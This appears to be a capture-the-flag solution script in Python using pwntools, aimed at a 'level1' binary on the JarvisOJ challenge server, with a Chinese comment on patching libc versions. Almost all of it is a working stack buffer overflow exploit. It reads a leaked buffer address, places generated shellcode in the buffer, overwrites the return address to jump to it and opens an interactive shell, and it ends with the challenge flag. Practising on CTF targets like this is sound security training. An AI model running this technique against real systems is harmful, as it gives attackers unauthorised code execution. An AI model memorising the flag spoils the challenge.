#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import sys
from typing import Optional
from pwn import *
from pwnlib import gdb

context(arch="i386", os="linux", log_level="debug")

class Config:
    def __init__(self,
            elf: str,
            remote_host: Optional[str]=None,
            remote_port: Optional[int]=None):
        self.elf: str = elf
        if remote_host is not None and remote_port is not None and 0 < remote_port < 65536:
            self.remote = (remote_host, remote_port)
        else:
            self.remote = None


cfg = Config("./level1", "pwn2.jarvisoj.com", 9877)
elf = ELF(cfg.elf)

if len(sys.argv) > 1:
    io = remote(cfg.remote[0], cfg.remote[1])
else:
    io = process(cfg.elf)
 

def main():
    io.recvuntil(":0x")
    buf_addr = int(io.recvuntil("?\n", drop=True), 16)
    log.success("buf_addr = %x", buf_addr)
    shell_code = asm(shellcraft.sh())
    payload = flat((
        shell_code.ljust(0x88 + 4, b"\0"),
        p32(buf_addr),
    ))
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{82c2aa534a9dede9c3a0045d0fec8617}
